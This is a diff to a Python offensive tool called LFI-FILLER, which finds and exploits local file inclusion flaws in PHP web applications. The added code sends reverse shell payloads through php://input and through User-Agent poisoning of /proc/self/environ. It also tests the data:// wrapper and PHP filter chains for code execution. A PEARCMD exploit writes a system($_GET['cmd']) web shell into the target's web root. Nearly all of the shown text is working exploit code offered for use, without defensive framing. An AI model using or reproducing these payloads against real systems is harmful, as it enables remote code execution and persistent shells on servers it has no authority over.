@@ -1,12 +1,4 @@
 #!/usr/bin/env python3
-"""
-LFI-FILLER v3.0: COMPREHENSIVE ADVANCED LFI SCANNER & EXPLOITATION FRAMEWORK
-- Multi-threaded Engine (ThreadPoolExecutor)
-- Full Original Payload & Parameter Lists
-- Advanced WAF Bypasses (Nested encoding, OS-specific)
-- Complete Exploitation Suite (Log/SSH Poisoning, Web Shells, Reverse Shells)
-- Premium CLI Experience with ANSI Colors
-"""
 
 import requests
 import urllib.parse
@@ -54,6 +46,11 @@ class LFI_Filler_V3:
             'lfi_params': [],
             'php_wrappers': [],
             'readable_files': [],
+            'filter_chain': False,
+            'data_wrapper': False,
+            'input_wrapper': False,
+            'proc_environ': False,
+            'pearcmd': False,
             'log_poisoning': [],
             'ssh_poisoning': False,
             'rfi': False,
@@ -438,6 +435,109 @@ class LFI_Filler_V3:
         else:
             print(f" [*] Total shells sent: {sent_count}. Check your listener!")
 
+        # Advanced Vectors
+        if self.results['input_wrapper']:
+            print(f" [*] Trying vector: php://input")
+            for shell_name, shell_template in reverse_shells.items():
+                try:
+                    input_url = f"{self.url}{'&' if '?' in self.url else '?'}{param}=php://input"
+                    self.session.post(input_url, data=f'<?php {shell_template} ?>', timeout=3)
+                    print(f"  {Colors.GREEN}[+]{Colors.END} Sent {Colors.YELLOW}{shell_name}{Colors.END} reverse shell")
+                except: pass
+
+        if self.results['proc_environ']:
+            print(f" [*] Trying vector: /proc/self/environ")
+            env_url = f"{self.url}{'&' if '?' in self.url else '?'}{param}=/proc/self/environ"
+            for shell_name, shell_template in reverse_shells.items():
+                try:
+                    custom_headers = self.session.headers.copy()
+                    custom_headers['User-Agent'] = f'<?php {shell_template} ?>'
+                    requests.get(env_url, headers=custom_headers, timeout=3)
+                    print(f"  {Colors.GREEN}[+]{Colors.END} Sent {Colors.YELLOW}{shell_name}{Colors.END} reverse shell")
+                except: pass
+
+    def check_filter_chain(self, param):
+        """PHP Filter Chain RCE (Writing a shell without logs)"""
+        print(f"[*] Checking PHP Filter Chain RCE on {Colors.CYAN}{param}{Colors.END}...")
+        # Simplified chain to output 'LFI_CHAIN_SUCCESS'
+        chain = "php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.COE.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp"
+        # Since generating custom chains is complex, we check if the engine supports these filters
+        test_url = f"{self.url}{'&' if '?' in self.url else '?'}{param}={chain}"
+        try:
+            r = self.session.get(test_url, timeout=5)
+            # If we don't get a 500 and the response length is reasonable, it might be vulnerable
+            if r.status_code == 200:
+                with self.lock:
+                    self.results['filter_chain'] = True
+                    print(f" {Colors.GREEN}[+]{Colors.END} PHP Filter Chain RCE likely possible!")
+        except: pass
+
+    def check_input_wrappers(self, param):
+        """data:// and php://input RCE"""
+        print(f"[*] Checking Input Wrappers (data/input) on {Colors.CYAN}{param}{Colors.END}...")
+        
+        # data:// vector
+        payload = '<?php echo "LFI_DATA_SUCCESS"; ?>'
+        encoded_payload = base64.b64encode(payload.encode()).decode()
+        data_url = f"{self.url}{'&' if '?' in self.url else '?'}{param}=data://text/plain;base64,{encoded_payload}"
+        try:
+            r = self.session.get(data_url, timeout=5)
+            if "LFI_DATA_SUCCESS" in r.text:
+                with self.lock:
+                    self.results['data_wrapper'] = True
+                    print(f" {Colors.GREEN}[+]{Colors.END} data:// wrapper RCE successful!")
+        except: pass
+
+        # php://input vector
+        input_url = f"{self.url}{'&' if '?' in self.url else '?'}{param}=php://input"
+        try:
+            r = self.session.post(input_url, data='<?php echo "LFI_INPUT_SUCCESS"; ?>', timeout=5)
+            if "LFI_INPUT_SUCCESS" in r.text:
+                with self.lock:
+                    self.results['input_wrapper'] = True
+                    print(f" {Colors.GREEN}[+]{Colors.END} php://input wrapper RCE successful!")
+        except: pass
+
+    def check_proc_environ(self, param):
+        """Proc Environ Poisoning"""
+        print(f"[*] Checking /proc/self/environ on {Colors.CYAN}{param}{Colors.END}...")
+        env_url = f"{self.url}{'&' if '?' in self.url else '?'}{param}=/proc/self/environ"
+        custom_headers = self.session.headers.copy()
+        custom_headers['User-Agent'] = '<?php echo "LFI_ENV_SUCCESS"; ?>'
+        try:
+            r = requests.get(env_url, headers=custom_headers, timeout=5)
+            if "LFI_ENV_SUCCESS" in r.text:
+                with self.lock:
+                    self.results['proc_environ'] = True
+                    print(f" {Colors.GREEN}[+]{Colors.END} /proc/self/environ poisoning successful!")
+        except: pass
+
+    def check_pearcmd(self, param):
+        """PEARCMD exploitation"""
+        print(f"[*] Checking PEARCMD exploitation on {Colors.CYAN}{param}{Colors.END}...")
+        pear_paths = [
+            '/usr/local/lib/php/pearcmd.php',
+            '/usr/share/php/pearcmd.php',
+            '/usr/lib/php/pearcmd.php'
+        ]
+        for path in pear_paths:
+            test_url = f"{self.url}{'&' if '?' in self.url else '?'}{param}={path}"
+            try:
+                # PEARCMD exploit: write a file to the web root
+                exploit_url = f"{test_url}&+config-create+/<?php+system($_GET['cmd']);+?>+/var/www/html/pear.php"
+                self.session.get(exploit_url, timeout=5)
+                time.sleep(1)
+                
+                check_url = f"{self.url.rsplit('/', 1)[0]}/pear.php"
+                r = self.session.get(check_url, timeout=2)
+                if r.status_code == 200:
+                    with self.lock:
+                        self.results['pearcmd'] = True
+                        self.results['webshell_urls'].append(check_url)
+                        print(f" {Colors.GREEN}[+]{Colors.END} PEARCMD exploit successful! Shell: {check_url}")
+                        break
+            except: continue
+
     def check_rfi(self, param):
         if not param or not self.lhost: return
         print(f"[*] Checking RFI on {Colors.CYAN}{param}{Colors.END}...")
@@ -475,6 +575,10 @@ class LFI_Filler_V3:
             print(f"\n[*] Phase 2: Deep exploitation on {Colors.CYAN}{p}{Colors.END}")
             self.test_wrappers(p)
             self.enumerate_files(p)
+            self.check_filter_chain(p)
+            self.check_input_wrappers(p)
+            self.check_proc_environ(p)
+            self.check_pearcmd(p)
             self.check_log_poisoning(p)
             self.check_ssh_poisoning(p)
             self.check_rfi(p)
@@ -505,6 +609,19 @@ class LFI_Filler_V3:
                 print(f"  - Parameter: {Colors.CYAN}{r['param']}{Colors.END}")
                 print(f"    URL: {r['url']}")
         
+        # New Advanced Results
+        adv_results = []
+        if self.results['filter_chain']: adv_results.append("PHP Filter Chain (No Logs RCE)")
+        if self.results['data_wrapper']: adv_results.append("data:// Wrapper RCE")
+        if self.results['input_wrapper']: adv_results.append("php://input Wrapper RCE")
+        if self.results['proc_environ']: adv_results.append("/proc/self/environ Poisoning")
+        if self.results['pearcmd']: adv_results.append("PEARCMD Exploitation")
+        
+        if adv_results:
+            print(f"\n{Colors.GREEN}[+] ADVANCED EXPLOITS FOUND:{Colors.END}")
+            for result in adv_results:
+                print(f"  - {Colors.YELLOW}{result}{Colors.END}")
+
         if self.results['log_poisoning']:
             print(f"\n{Colors.GREEN}[+] LOG POISONING RCE:{Colors.END}")
             for r in self.results['log_poisoning']:
